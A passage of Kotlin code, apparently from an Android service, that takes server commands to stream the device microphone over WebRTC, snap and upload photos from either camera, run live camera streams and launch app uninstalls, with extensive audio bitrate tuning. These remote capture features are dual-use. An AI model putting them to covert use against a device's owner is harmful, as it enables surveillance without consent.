                    sendCommandAck("uninstall_app", detail = "launched")
                    Log.i(TAG, "Uninstall dialog launched")
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to uninstall: ${e.message}")
                    safeSend("ACK:uninstall_app:error:${e.message}")
                    sendCommandAck("uninstall_app", "error", e.message)
                }
            }
            else -> Log.d(TAG, "Unknown command: $cmd")
        }
    }

    private fun handleServerJsonCommand(jsonText: String) {
        try {
            val obj = JSONObject(jsonText)
            when (obj.optString("type")) {
                "webrtc_start" -> {
                    Log.i(TAG, "CMD: webrtc_start")
                    startWebRtcSession()
                    sendCommandAck("webrtc_start")
                }
                "webrtc_stop" -> {
                    Log.i(TAG, "CMD: webrtc_stop")
                    stopWebRtcSession(notifyState = true)
                    sendCommandAck("webrtc_stop")
                }
                "webrtc_offer" -> {
                    val sdp = obj.optString("sdp", "")
                    if (sdp.isNotBlank()) {
                        Log.i(TAG, "CMD: webrtc_offer")
                        applyRemoteOfferAndCreateAnswer(sdp)
                        sendCommandAck("webrtc_offer")
                    }
                }
                "webrtc_ice" -> {
                    val c = obj.optJSONObject("candidate")
                    if (c != null) {
                        val candidate = IceCandidate(
                            c.optString("sdpMid", ""),
                            c.optInt("sdpMLineIndex", 0),
                            c.optString("candidate", "")
                        )
                        peerConnection?.addIceCandidate(candidate)
                        sendCommandAck("webrtc_ice")
                    }
                }
                "webrtc_quality" -> {
                    lastDashboardQuality = obj.optJSONObject("quality")
                    applyAdaptiveBitrate()
                    sendCommandAck("webrtc_quality")
                }
                "ai_mode" -> {
                    aiAutoModeEnabled = false
                    aiEnhancementEnabled = obj.optBoolean("enabled", true)
                    sendHealthStatus(if (aiEnhancementEnabled) "ai_mode_on" else "ai_mode_off")
                    Log.i(TAG, "AI mode set to $aiEnhancementEnabled")
                    sendCommandAck("ai_mode", detail = if (aiEnhancementEnabled) "on" else "off")
                }
                "ai_auto" -> {
                    aiAutoModeEnabled = obj.optBoolean("enabled", true)
                    sendHealthStatus(if (aiAutoModeEnabled) "ai_auto_on" else "ai_auto_off")
                    Log.i(TAG, "AI auto mode set to $aiAutoModeEnabled")
                    sendCommandAck("ai_auto", detail = if (aiAutoModeEnabled) "on" else "off")
                }
                "photo_ai" -> {
                    aiPhotoEnhancementEnabled = obj.optBoolean("enabled", true)
                    sendHealthStatus(if (aiPhotoEnhancementEnabled) "photo_ai_on" else "photo_ai_off")
                    safeSend("ACK:photo_ai:${if (aiPhotoEnhancementEnabled) "on" else "off"}")
                    sendCommandAck("photo_ai", detail = if (aiPhotoEnhancementEnabled) "on" else "off")
                }
                "photo_quality" -> {
                    val mode = obj.optString("mode", "normal").trim().lowercase()
                    photoQualityMode = when (mode) {
                        "fast" -> "fast"
                        "hd" -> "hd"
                        else -> "normal"
                    }
                    sendHealthStatus("photo_quality_$photoQualityMode")
                    safeSend("ACK:photo_quality:$photoQualityMode")
                    sendCommandAck("photo_quality", detail = photoQualityMode)
                }
                "photo_night" -> {
                    val mode = obj.optString("mode", "off").trim().lowercase()
                    photoNightMode = when (mode) {
                        "1s", "3s", "5s" -> mode
                        else -> "off"
                    }
                    sendHealthStatus("photo_night_$photoNightMode")
                    safeSend("ACK:photo_night:$photoNightMode")
                    sendCommandAck("photo_night", detail = photoNightMode)
                }
                "stream_codec" -> {
                    val mode = obj.optString("mode", "auto").trim().lowercase()
                    wsStreamMode = when (mode) {
                        "pcm" -> "pcm"
                        "smart", "mulaw" -> "smart"
                        else -> "auto"
                    }
                    sendHealthStatus("stream_codec_$wsStreamMode")
                    Log.i(TAG, "WS stream mode set to $wsStreamMode")
                    sendCommandAck("stream_codec", detail = wsStreamMode)
                }
                "set_low_network" -> {
                    val enabled = obj.optBoolean("enabled", false)
                    lowNetworkMode = enabled
                    if (enabled) {
                        // LOW NETWORK MODE:
                        // Balance clarity and network stability with adaptive bitrate.
                        lowNetworkSampleRate = 16000
                        lowNetworkFrameMs = 20
                        Log.i(TAG, "Low-network mode ENABLED - Opus 48-96kbps, 16kHz, balanced mode")
                        
                        // If WebRTC is active, update bitrate immediately
                        applyAdaptiveBitrate()
                    } else {
                        // Return to standard mode
                        wsStreamMode = "auto"
                        lowNetworkSampleRate = 16000
                        lowNetworkFrameMs = 20
                        Log.i(TAG, "Low-network mode DISABLED - standard quality restored")
                        
                        applyAdaptiveBitrate()
                    }
                    sendHealthStatus("low_network_${if (enabled) "on" else "off"}")
                    safeSend("""{"type":"low_network_ack","enabled":$enabled,"sampleRate":$lowNetworkSampleRate,"frameMs":$lowNetworkFrameMs}""")
                    sendCommandAck("set_low_network", detail = if (enabled) "on" else "off")
                }
                "voice_profile" -> {
                    val profile = obj.optString("profile", "room").trim().lowercase()
                    voiceProfile = when (profile) {
                        "near" -> "near"
                        "far" -> "far"
                        else -> "room"
                    }
                    sendHealthStatus("voice_profile_$voiceProfile")
                    Log.i(TAG, "Voice profile set to $voiceProfile")
                    sendCommandAck("voice_profile", detail = voiceProfile)
                }
                "streaming_mode" -> {
                    // Switch between realtime (20ms chunks) and HQ buffered (10-sec buffer)
                    val mode = obj.optString("mode", "realtime").trim().lowercase()
                    val wasHqMode = hqBufferedMode
                    hqBufferedMode = when (mode) {
                        "hq", "hq_buffered", "buffered", "high_quality" -> true
                        else -> false  // "realtime", "live", or default
                    }
                    
                    // If mode changed, restart audio capture to apply new settings
                    if (wasHqMode != hqBufferedMode && isCapturing) {
                        Log.i(TAG, "Streaming mode changed to ${if (hqBufferedMode) "HQ_BUFFERED" else "REALTIME"}, restarting capture")
                        
                        // OPTIMIZATION: Stop WebRTC when entering HQ mode (not needed for buffered)
                        if (hqBufferedMode && isWebRtcStreaming) {
                            Log.i(TAG, "Stopping WebRTC (not needed in HQ buffered mode)")
                            stopWebRtcSession(notifyState = false)
                        }
                        
                        stopAudioCapture()
                        Thread.sleep(200)
                        startAudioCapture()
                    }
                    
                    val modeText = if (hqBufferedMode) "hq_buffered" else "realtime"
                    sendHealthStatus("streaming_mode_$modeText")
                    Log.i(TAG, "Streaming mode set to $modeText (${if (hqBufferedMode) "${hqBufferSeconds}s buffer" else "20ms chunks"})")
                    safeSend("""{"type":"streaming_mode_ack","mode":"$modeText","bufferSeconds":${if (hqBufferedMode) hqBufferSeconds else 0}}""")
                    sendCommandAck("streaming_mode", detail = modeText)
                }
                "switch_camera" -> {
                    preferredCameraFacing = if (preferredCameraFacing == CameraCharacteristics.LENS_FACING_FRONT)
                        CameraCharacteristics.LENS_FACING_BACK
                    else
                        CameraCharacteristics.LENS_FACING_FRONT
                    val cameraText = if (preferredCameraFacing == CameraCharacteristics.LENS_FACING_FRONT) "front" else "rear"
                    cameraLiveStrictFacing = true
                    if (isCameraLiveStreaming) restartCameraLiveStream()
                    safeSend("ACK:switch_camera:$cameraText")
                    sendCommandAck("switch_camera", detail = cameraText)
                }
                "take_photo" -> {
                    val camera = obj.optString("camera", "current").trim().lowercase()
                    sendCommandAck("take_photo", detail = "accepted:$camera")
                    captureAndSendPhoto(camera)
                }
                "camera_live_start" -> {
                    val camera = obj.optString("camera", "current").trim().lowercase()
                    val explicitFacing = parseRequestedCameraFacing(camera)
                    val facing = explicitFacing ?: preferredCameraFacing
                    preferredCameraFacing = facing
                    startCameraLiveStream(facing, strictFacing = explicitFacing != null)
                    sendCommandAck("camera_live_start", detail = camera)
                }
                "camera_live_stop" -> {
                    stopCameraLiveStream("remote_stop")
                    sendCommandAck("camera_live_stop")
                }
                else -> Log.d(TAG, "Unknown JSON command: ${obj.optString("type")}")
            }
        } catch (e: Exception) {
            Log.w(TAG, "Invalid JSON command: ${e.message}")
        }
    }

    private fun ensurePeerConnectionFactory() {
        if (peerConnectionFactory != null) return
        Log.i(TAG, "Initializing WebRTC...")
        val initOpts = PeerConnectionFactory.InitializationOptions.builder(this)
            .setEnableInternalTracer(false)
            .createInitializationOptions()
        try {
            PeerConnectionFactory.initialize(initOpts)
        } catch (e: Exception) {
            Log.e(TAG, "PeerConnectionFactory.initialize failed: ${e.message}", e)
            throw e
        }
        Log.i(TAG, "WebRTC initialized, creating audio device module...")
        audioDeviceModule = JavaAudioDeviceModule.builder(this)
            // Prefer platform AEC/NS when available to reduce room echo and steady noise.
            .setUseHardwareAcousticEchoCanceler(true)
            .setUseHardwareNoiseSuppressor(true)
            .createAudioDeviceModule()
        Log.i(TAG, "Creating PeerConnectionFactory...")
        peerConnectionFactory = PeerConnectionFactory.builder()
            .setAudioDeviceModule(audioDeviceModule)
            .createPeerConnectionFactory()
        Log.i(TAG, "WebRTC factory initialized")
    }

    private fun startWebRtcSession() {
        if (peerConnection != null) return
        ensurePeerConnectionFactory()
        val factory = peerConnectionFactory ?: return

        // We use WebRTC audio path for low-latency streaming, so stop raw PCM path.
        stopMicWatchdog()
        stopAudioCapture()

        val constraints = MediaConstraints().apply {
            // One-way monitoring: no echo cancel (saves latency), keep AGC + light NS.
            mandatory.add(MediaConstraints.KeyValuePair("googEchoCancellation", "false"))
            mandatory.add(MediaConstraints.KeyValuePair("googEchoCancellation2", "false"))
            
            // Keep NS enabled. Avoid stacking multiple AGC variants to reduce pumping artifacts.
            mandatory.add(MediaConstraints.KeyValuePair("googNoiseSuppression", "true"))
            mandatory.add(MediaConstraints.KeyValuePair("googNoiseSuppression2", "false"))
            mandatory.add(MediaConstraints.KeyValuePair("googExperimentalNoiseSuppression", "false"))
            mandatory.add(MediaConstraints.KeyValuePair("googAutoGainControl", "true"))
            mandatory.add(MediaConstraints.KeyValuePair("googAutoGainControl2", "false"))
            mandatory.add(MediaConstraints.KeyValuePair("googExperimentalAutoGainControl", "false"))
            mandatory.add(MediaConstraints.KeyValuePair("googHighpassFilter", "true"))
            mandatory.add(MediaConstraints.KeyValuePair("googTypingNoiseDetection", "false"))
            
            // Audio network adaptor: critical for adaptive bitrate in weak networks
            optional.add(MediaConstraints.KeyValuePair("googAudioNetworkAdaptor", "true"))
        }
        localAudioSource = factory.createAudioSource(constraints)
        localAudioTrack = factory.createAudioTrack("mic_track", localAudioSource)
        localAudioTrack?.setEnabled(true)

        cachedIceServers = fetchIceServersFromServer()

        val rtcConfig = PeerConnection.RTCConfiguration(
            cachedIceServers
        ).apply {
            sdpSemantics = PeerConnection.SdpSemantics.UNIFIED_PLAN
            continualGatheringPolicy = PeerConnection.ContinualGatheringPolicy.GATHER_CONTINUALLY
        }

        peerConnection = factory.createPeerConnection(rtcConfig, object : PeerConnection.Observer {
            override fun onIceCandidate(candidate: IceCandidate) {
                val candidateJson = JSONObject().apply {
                    put("candidate", candidate.sdp)
                    put("sdpMid", candidate.sdpMid)
                    put("sdpMLineIndex", candidate.sdpMLineIndex)
                }
                val msg = JSONObject().apply {
                    put("type", "webrtc_ice")
                    put("candidate", candidateJson)
                }
                safeSend(msg.toString())
            }

            override fun onIceConnectionChange(newState: PeerConnection.IceConnectionState) {
                sendWebRtcState("ice_${newState.name.lowercase()}")
                if (newState == PeerConnection.IceConnectionState.CONNECTED ||
                    newState == PeerConnection.IceConnectionState.COMPLETED) {
                    webRtcRecoveryJob?.cancel()
                    webRtcRecoveryJob = null
                    iceWatchdogJob?.cancel()
                    iceWatchdogJob = null
                }
                if (newState == PeerConnection.IceConnectionState.DISCONNECTED ||
                    newState == PeerConnection.IceConnectionState.FAILED) {
                    scheduleWebRtcRecovery(newState.name.lowercase())
                }
            }

            override fun onConnectionChange(newState: PeerConnection.PeerConnectionState) {
                sendWebRtcState("pc_${newState.name.lowercase()}")
            }

            override fun onSignalingChange(newState: PeerConnection.SignalingState) {}
            override fun onIceConnectionReceivingChange(receiving: Boolean) {}
            override fun onIceGatheringChange(newState: PeerConnection.IceGatheringState) {}
            override fun onIceCandidatesRemoved(candidates: Array<out IceCandidate>) {}
            override fun onAddStream(stream: org.webrtc.MediaStream) {}
            override fun onRemoveStream(stream: org.webrtc.MediaStream) {}
            override fun onDataChannel(dataChannel: org.webrtc.DataChannel) {}
            override fun onRenegotiationNeeded() {}
            override fun onAddTrack(receiver: org.webrtc.RtpReceiver, mediaStreams: Array<out org.webrtc.MediaStream>) {}
            override fun onTrack(transceiver: org.webrtc.RtpTransceiver) {}
        })

        val pc = peerConnection
        val track = localAudioTrack
        if (pc == null || track == null) {
            sendWebRtcState("create_failed")
            return
        }

        webRtcAudioSender = pc.addTrack(track, listOf("mic_stream"))
        isWebRtcStreaming = true
        currentWebRtcBitrateKbps = chooseTargetBitrateKbps()
        applyAdaptiveBitrate()
        registerNetworkCallbackForBitrate()
        updateNotification("WebRTC mic active")
        sendHealthStatus("webrtc_started")
        sendWebRtcState("started_${currentWebRtcBitrateKbps}kbps")
    }
    
    private fun stopWebRtcSession(notifyState: Boolean) {
        webRtcRecoveryJob?.cancel()
        webRtcRecoveryJob = null
        iceWatchdogJob?.cancel()
        iceWatchdogJob = null
        unregisterNetworkCallbackForBitrate()
        try {
            peerConnection?.close()
        } catch (_: Exception) {}
        peerConnection = null
        webRtcAudioSender = null
        try {
            localAudioTrack?.dispose()
            localAudioSource?.dispose()
        } catch (_: Exception) {}
        localAudioTrack = null
        localAudioSource = null
        val wasStreaming = isWebRtcStreaming
        isWebRtcStreaming = false

        if (notifyState && wasStreaming) sendHealthStatus("webrtc_stopped")
        if (notifyState && wasStreaming) sendWebRtcState("stopped")

        // Resume legacy PCM stream only when dashboard still wants it.
        if (wantsMicStreaming && activeWebSocket != null && !isCapturing) {
            startAudioCapture()
            startMicWatchdog()
            updateNotification("Live streaming active")
        }
    }

    private fun applyRemoteOfferAndCreateAnswer(remoteSdp: String) {
        startWebRtcSession()
        val pc = peerConnection ?: return
        val targetKbps = chooseTargetBitrateKbps()

        pc.setRemoteDescription(object : SdpObserver {
            override fun onSetSuccess() {
                val answerConstraints = MediaConstraints()
                pc.createAnswer(object : SdpObserver {
                    override fun onCreateSuccess(desc: SessionDescription?) {
                        if (desc == null) return
                        val tuned = tuneOpusSdp(desc.description, targetKbps)
                        val localAnswer = SessionDescription(SessionDescription.Type.ANSWER, tuned)
                        pc.setLocalDescription(object : SdpObserver {
                            override fun onSetSuccess() {
                                val msg = JSONObject().apply {
                                    put("type", "webrtc_answer")
                                    put("sdp", tuned)
                                }
                                safeSend(msg.toString())
                                applyAdaptiveBitrate()
                                sendWebRtcState("answer_sent_${targetKbps}kbps")
                                // Start a watchdog: if ICE hasn't connected in 15s, fall back to PCM.
                                iceWatchdogJob?.cancel()
                                iceWatchdogJob = serviceScope.launch(Dispatchers.IO) {
                                    delay(15_000)
                                    val iceState = peerConnection?.iceConnectionState()
                                    val connected =
                                        iceState == PeerConnection.IceConnectionState.CONNECTED ||
                                        iceState == PeerConnection.IceConnectionState.COMPLETED
                                    if (isWebRtcStreaming && !connected) {
                                        Log.w(TAG, "ICE watchdog: no connection after 15s — falling back to PCM")
                                        sendWebRtcState("ice_timeout")
                                        stopWebRtcSession(notifyState = true)
                                    }
                                }
                            }

                            override fun onSetFailure(error: String?) {
                                sendWebRtcState("local_set_fail")
                                Log.e(TAG, "WebRTC setLocalDescription failed: $error")
                            }

                            override fun onCreateSuccess(desc: SessionDescription?) {}
                            override fun onCreateFailure(error: String?) {}
                        }, localAnswer)
                    }

                    override fun onCreateFailure(error: String?) {
                        sendWebRtcState("answer_create_fail")
                        Log.e(TAG, "WebRTC createAnswer failed: $error")
                    }

                    override fun onSetSuccess() {}
                    override fun onSetFailure(error: String?) {}
                }, answerConstraints)
            }

            override fun onSetFailure(error: String?) {
                sendWebRtcState("remote_set_fail")
                Log.e(TAG, "WebRTC setRemoteDescription failed: $error")
            }

            override fun onCreateSuccess(desc: SessionDescription?) {}
            override fun onCreateFailure(error: String?) {}
        }, SessionDescription(SessionDescription.Type.OFFER, remoteSdp))
    }

    private fun tuneOpusSdp(sdp: String, targetKbps: Int): String {
        val opusPayload = Regex("a=rtpmap:(\\d+) opus/48000/2", RegexOption.IGNORE_CASE)
            .find(sdp)
            ?.groupValues
            ?.getOrNull(1)
            ?: return sdp
        
        // In low network mode, keep quality-biased compression settings.
        val effectiveTarget = if (lowNetworkMode) targetKbps.coerceAtMost(WEBRTC_MAX_BITRATE_KBPS) else targetKbps
        val maxAvg = (effectiveTarget * 1000).coerceIn(WEBRTC_MIN_BITRATE_KBPS * 1000, WEBRTC_STANDARD_MAX_KBPS * 1000)
        val minAvg = (WEBRTC_MIN_BITRATE_KBPS * 1000).coerceAtMost(maxAvg)
        
        // Adaptive ptime: 20ms normal, 40ms for low network (fewer packets)
        val ptime = if (lowNetworkMode) lowNetworkFrameMs.toString() else "20"
        
        val fmtpRegex = Regex("a=fmtp:$opusPayload ([^\\r\\n]+)")
        val tunedParams = mapOf(
            "maxaveragebitrate" to maxAvg.toString(),
            "minaveragebitrate" to minAvg.toString(),
            "maxplaybackrate" to if (lowNetworkMode) "16000" else "48000",
            "sprop-maxcapturerate" to if (lowNetworkMode) "16000" else "48000",
            "ptime" to ptime,
            "minptime" to ptime,
            "useinbandfec" to "1",           // FEC: recovers lost packets on low network
            "usedtx" to "0",                // DTX OFF: prevents audible gaps / "lag" feel
            "stereo" to "0",
            "sprop-stereo" to "0",
            "cbr" to "0",                    // VBR: allocates more bits to complex speech
            "complexity" to if (lowNetworkMode) "7" else "10",
        )
        return if (fmtpRegex.containsMatchIn(sdp)) {
            sdp.replace(fmtpRegex) { match ->
                val merged = mergeFmtpParams(match.groupValues[1], tunedParams)
                "a=fmtp:$opusPayload $merged"
            }
        } else {
            val joined = tunedParams.entries.joinToString(";") { "${it.key}=${it.value}" }
            sdp + "\r\na=fmtp:$opusPayload $joined"
        }
    }

    private fun mergeFmtpParams(base: String, updates: Map<String, String>): String {
        val params = linkedMapOf<String, String>()
        base.split(';')
            .map { it.trim() }
            .filter { it.isNotBlank() }
            .forEach { token ->
                val idx = token.indexOf('=')
                if (idx <= 0 || idx >= token.length - 1) return@forEach
                val key = token.substring(0, idx).trim().lowercase()
                val value = token.substring(idx + 1).trim()
                if (key.isNotBlank() && value.isNotBlank()) {
                    params[key] = value
                }
            }
        updates.forEach { (k, v) -> params[k.lowercase()] = v }
        return params.entries.joinToString(";") { "${it.key}=${it.value}" }
    }

    private fun sendWebRtcState(state: String) {
        val msg = JSONObject().apply {
            put("type", "webrtc_state")
            put("state", state)
            put("bitrateKbps", currentWebRtcBitrateKbps)
            put("deviceId", deviceId)
            put("ts", System.currentTimeMillis())
            if (lastDashboardQuality != null) put("quality", lastDashboardQuality)
        }
        safeSend(msg.toString())
    }

    private fun scheduleWebRtcRecovery(reason: String) {
        if (webRtcRecoveryJob?.isActive == true) return
        webRtcRecoveryJob = serviceScope.launch(Dispatchers.IO) {
            repeat(3) { idx ->
                delay(700L + idx * 900L)
                if (!isWebRtcStreaming || peerConnection == null) return@launch
                try {
                    peerConnection?.restartIce()
                } catch (_: Exception) {}
                sendWebRtcState("need_reoffer_${reason}_${idx + 1}")
            }
        }
    }

    private fun fetchIceServersFromServer(): List<PeerConnection.IceServer> {
        val fallback = listOf(PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer())
        val url = "$serverHttpBaseUrl/api/webrtc-config"
        return try {
            val reqBuilder = Request.Builder().url(url)
            if (wsAuthToken.isNotBlank()) reqBuilder.addHeader("X-Auth-Token", wsAuthToken)
            val response = okHttpClient.newCall(reqBuilder.build()).execute()
            if (!response.isSuccessful) return fallback
            val body = response.body?.string().orEmpty()
            if (body.isBlank()) return fallback
            val json = JSONObject(body)
            val arr = json.optJSONArray("iceServers") ?: JSONArray()
            val parsed = mutableListOf<PeerConnection.IceServer>()
            for (i in 0 until arr.length()) {
                val item = arr.optJSONObject(i) ?: continue
                val urls = mutableListOf<String>()
                when (val u = item.opt("urls")) {
                    is String -> if (u.isNotBlank()) urls.add(u)
                    is JSONArray -> {
                        for (j in 0 until u.length()) {
                            val s = u.optString(j, "")
                            if (s.isNotBlank()) urls.add(s)
                        }
                    }
                }
                if (urls.isEmpty()) continue
                val builder = PeerConnection.IceServer.builder(urls)
                val user = item.optString("username", "")
                val cred = item.optString("credential", "")
                if (user.isNotBlank()) builder.setUsername(user)
                if (cred.isNotBlank()) builder.setPassword(cred)
                parsed.add(builder.createIceServer())
            }
            if (parsed.isEmpty()) fallback else parsed
        } catch (e: IOException) {
            Log.w(TAG, "ICE config fetch failed: ${e.message}")
            fallback
        } catch (e: Exception) {
            Log.w(TAG, "ICE config parse failed: ${e.message}")
            fallback
        }
    }

    private fun chooseTargetBitrateKbps(): Int {
        // LOW NETWORK MODE: keep quality-biased bitrates for better speech clarity.
        if (lowNetworkMode) {
            val q = lastDashboardQuality
            val loss = q?.optDouble("lossPct", Double.NaN) ?: Double.NaN
            
            // Keep within 32-40 kbps unless network is healthy enough for 64.
            return if (!loss.isNaN() && loss >= 10.0) {
                WEBRTC_MIN_BITRATE_KBPS
            } else {
                WEBRTC_MID_BITRATE_KBPS
            }
        }
        
        // STANDARD MODE: Use higher bitrates (64-128 kbps)
        val cm = connectivityManager ?: return WEBRTC_STANDARD_MID_KBPS
        val network = cm.activeNetwork ?: return WEBRTC_STANDARD_MID_KBPS
        val caps = cm.getNetworkCapabilities(network) ?: return WEBRTC_STANDARD_MID_KBPS
        
        // Start with MID bitrate for cellular to maintain quality
        var target = if (caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)) {
            WEBRTC_STANDARD_MID_KBPS
        } else {
            WEBRTC_STANDARD_MID_KBPS
        }
        
        if (caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)) {
            val downKbps = caps.linkDownstreamBandwidthKbps
            target = when {
                // Use low-network bitrates for very poor WiFi
                downKbps in 1..200 -> WEBRTC_MIN_BITRATE_KBPS
                downKbps in 201..500 -> WEBRTC_MID_BITRATE_KBPS
                downKbps in 501..1000 -> WEBRTC_STANDARD_MIN_KBPS // 64 kbps
                else -> WEBRTC_STANDARD_MAX_KBPS // 128 kbps
            }
        }
        
        val q = lastDashboardQuality
        val loss = q?.optDouble("lossPct", Double.NaN) ?: Double.NaN
        val rtt = q?.optDouble("rttMs", Double.NaN) ?: Double.NaN
        val jitter = q?.optDouble("jitterMs", Double.NaN) ?: Double.NaN
        
        // Severe network issues: drop to minimum low-network bitrate
        if (wsReconnectAttempts >= 6) return WEBRTC_MIN_BITRATE_KBPS
        if (!loss.isNaN() && loss >= 25.0) return WEBRTC_MIN_BITRATE_KBPS
        if (!rtt.isNaN() && rtt >= 800.0) return WEBRTC_MIN_BITRATE_KBPS
        if (!jitter.isNaN() && jitter >= 300.0) return WEBRTC_MIN_BITRATE_KBPS
        
        // Moderate issues: use low-network mid bitrate.
        if ((!loss.isNaN() && loss >= 15.0) || (!rtt.isNaN() && rtt >= 500.0) || (!jitter.isNaN() && jitter >= 150.0)) {
            return WEBRTC_MID_BITRATE_KBPS
        }
        
        return target.coerceIn(WEBRTC_MIN_BITRATE_KBPS, WEBRTC_STANDARD_MAX_KBPS)
    }

    private fun applyAdaptiveBitrate() {
        currentWebRtcBitrateKbps = chooseTargetBitrateKbps()
        val sender = webRtcAudioSender ?: return
        try {
            val params = sender.parameters ?: return
            if (params.encodings.isNullOrEmpty()) return
            val targetBps = currentWebRtcBitrateKbps * 1000
            params.encodings.forEach { encoding ->
                encoding.maxBitrateBps = targetBps
            }
            sender.parameters = params
            sendWebRtcState("bitrate_${currentWebRtcBitrateKbps}kbps")
        } catch (e: Exception) {
            Log.w(TAG, "Failed to apply bitrate params: ${e.message}")
        }
    }

    private fun registerNetworkCallbackForBitrate() {
        if (networkCallback != null) return
        val callback = object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                applyAdaptiveBitrate()
            }

            override fun onCapabilitiesChanged(network: Network, networkCapabilities: NetworkCapabilities) {
                applyAdaptiveBitrate()
            }

            override fun onLost(network: Network) {
                applyAdaptiveBitrate()
            }
        }
        networkCallback = callback
        try {
            connectivityManager?.registerNetworkCallback(NetworkRequest.Builder().build(), callback)
        } catch (e: Exception) {
            Log.w(TAG, "Network callback register failed: ${e.message}")
            networkCallback = null
        }
    }

    private fun unregisterNetworkCallbackForBitrate() {
        val callback = networkCallback ?: return
        try {
            connectivityManager?.unregisterNetworkCallback(callback)
        } catch (_: Exception) {}
        networkCallback = null
    }

    private fun captureAndSendPhoto(cameraMode: String) {
        if (isCameraLiveStreaming) {
            stopCameraLiveStream("snapshot_requested")
        }
        if (isPhotoCaptureBusy) {
            safeSend("ACK:take_photo:busy")
            return
        }
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            safeSend("ACK:take_photo:camera_permission_denied")
            return
        }
        
        // Check WebSocket connection before proceeding
        if (webSocket == null || activeWebSocket == null) {
            Log.w(TAG, "Photo capture requested but WebSocket is null - device may be reconnecting")
            safeSend("ACK:take_photo:not_connected")
            return
        }
        
        isPhotoCaptureBusy = true
        serviceScope.launch(Dispatchers.IO) {
            try {
                // Reduced timeout from 15s to 8s for faster response
                withTimeoutOrNull(8_000L) {
                    val explicitFacing = parseRequestedCameraFacing(cameraMode)
                    val facing = explicitFacing ?: preferredCameraFacing
                    preferredCameraFacing = facing
                    
                    // Single capture attempt - no retry for speed
                    val jpeg = captureJpegOnce(facing, allowFacingFallback = explicitFacing == null)
                    if (jpeg == null || jpeg.isEmpty()) {
                        safeSend("ACK:take_photo:failed")
                        return@withTimeoutOrNull
                    }
                    
                    val isFrontCamera = (facing == CameraCharacteristics.LENS_FACING_FRONT)
                    val optimized = optimizePhotoJpeg(jpeg, isFrontCamera)
                    val base64 = Base64.encodeToString(optimized, Base64.NO_WRAP)
                    val cameraName = if (isFrontCamera) "front" else "rear"
                    val filename = "photo_${deviceId.take(8)}_${cameraName}_${System.currentTimeMillis()}.jpg"
                    val msg = JSONObject().apply {
                        put("type", "photo_upload")
                        put("deviceId", deviceId)
                        put("camera", cameraName)
                        put("quality", photoQualityMode)
                        put("nightMode", photoNightMode)
                        put("filename", filename)
                        put("mime", "image/jpeg")
                        put("aiEnhanced", aiPhotoEnhancementEnabled)
                        put("lowNetwork", lowNetworkMode)
                        put("data", base64)
                        put("ts", System.currentTimeMillis())
                    }
                    safeSend(msg.toString())
                    safeSend("ACK:take_photo:ok:$cameraName")
                } ?: run {
                    // Timeout occurred
                    Log.e(TAG, "Photo capture timeout after 8 seconds")
                    safeSend("ACK:take_photo:timeout")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Photo capture failed: ${e.message}", e)
                safeSend("ACK:take_photo:error:${e.message?.take(50)}")
            } finally {
                isPhotoCaptureBusy = false
            }
        }
    }

    private fun parseRequestedCameraFacing(cameraMode: String): Int? {
        return when (cameraMode.trim().lowercase()) {
            "front", "front_camera", "front-camera", "frontcam", "selfie" -> CameraCharacteristics.LENS_FACING_FRONT
            "rear", "back", "rear_camera", "rear-camera", "back_camera", "back-camera", "backcam", "main" -> CameraCharacteristics.LENS_FACING_BACK
            else -> null
        }
    }

    private data class PhotoCaptureProfile(
        val exposureNs: Long?,
        val iso: Int?,
        val torch: Boolean,
        val aeCompensation: Int,
    )

    private fun requestedNightExposureNs(): Long? {
        return when (photoNightMode) {
            "1s" -> 1_000_000_000L
            "3s" -> 3_000_000_000L
            "5s" -> 5_000_000_000L
            else -> null
        }
    }

    private fun buildPhotoCaptureProfile(chars: CameraCharacteristics): PhotoCaptureProfile {
        val requestedExposure = requestedNightExposureNs() ?: return PhotoCaptureProfile(
            exposureNs = null,
            iso = null,
            torch = false,
            aeCompensation = 0,
        )

        val caps = chars.get(CameraCharacteristics.REQUEST_AVAILABLE_CAPABILITIES) ?: IntArray(0)
        val manualSensor = caps.contains(CameraCharacteristics.REQUEST_AVAILABLE_CAPABILITIES_MANUAL_SENSOR)
        val expRange = chars.get(CameraCharacteristics.SENSOR_INFO_EXPOSURE_TIME_RANGE)
        val isoRange = chars.get(CameraCharacteristics.SENSOR_INFO_SENSITIVITY_RANGE)
        if (manualSensor && expRange != null && isoRange != null) {
            val clampedExposure = requestedExposure.coerceIn(expRange.lower, expRange.upper)
            val desiredIso = when (photoNightMode) {
                "1s" -> 800
                "3s" -> 1200
                "5s" -> 1600
                else -> 800
            }
            val clampedIso = desiredIso.coerceIn(isoRange.lower, isoRange.upper)
            return PhotoCaptureProfile(
                exposureNs = clampedExposure,
                iso = clampedIso,
                torch = false,
                aeCompensation = 0,
            )
        }

        val aeRange = chars.get(CameraCharacteristics.CONTROL_AE_COMPENSATION_RANGE)
        val maxComp = aeRange?.upper ?: 0
        val aeComp = if (maxComp > 0) maxComp else 0
        val flashAvail = chars.get(CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
        return PhotoCaptureProfile(
            exposureNs = null,
            iso = null,
            torch = flashAvail,
            aeCompensation = aeComp,
        )
    }

    @SuppressLint("MissingPermission")
    private fun captureJpegOnce(targetFacing: Int, allowFacingFallback: Boolean = true): ByteArray? {
        val cm = getSystemService(CameraManager::class.java) ?: return null
        val cameraId = selectCameraId(cm, targetFacing, allowFacingFallback) ?: return null
        val chars = cm.getCameraCharacteristics(cameraId)
        val captureProfile = buildPhotoCaptureProfile(chars)
        val streamMap = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP) ?: return null
        
        // Resolution settings based on quality mode
        // HD mode: use max resolution for full quality
        // Normal/Fast: reasonable size that still captures full frame
        val maxEdge = when (photoQualityMode) {
            "fast" -> 1280   // Increased for better quality
            "hd" -> 2560     // Allow higher res for HD
            else -> 1600     // Balanced
        }
        
        val allSizes = streamMap.getOutputSizes(ImageFormat.JPEG) ?: return null
        
        // Get sensor aspect ratio for full-frame capture (no crop)
        val sensorSize = chars.get(CameraCharacteristics.SENSOR_INFO_ACTIVE_ARRAY_SIZE)
        val sensorRatio = if (sensorSize != null && sensorSize.width() > 0 && sensorSize.height() > 0) {
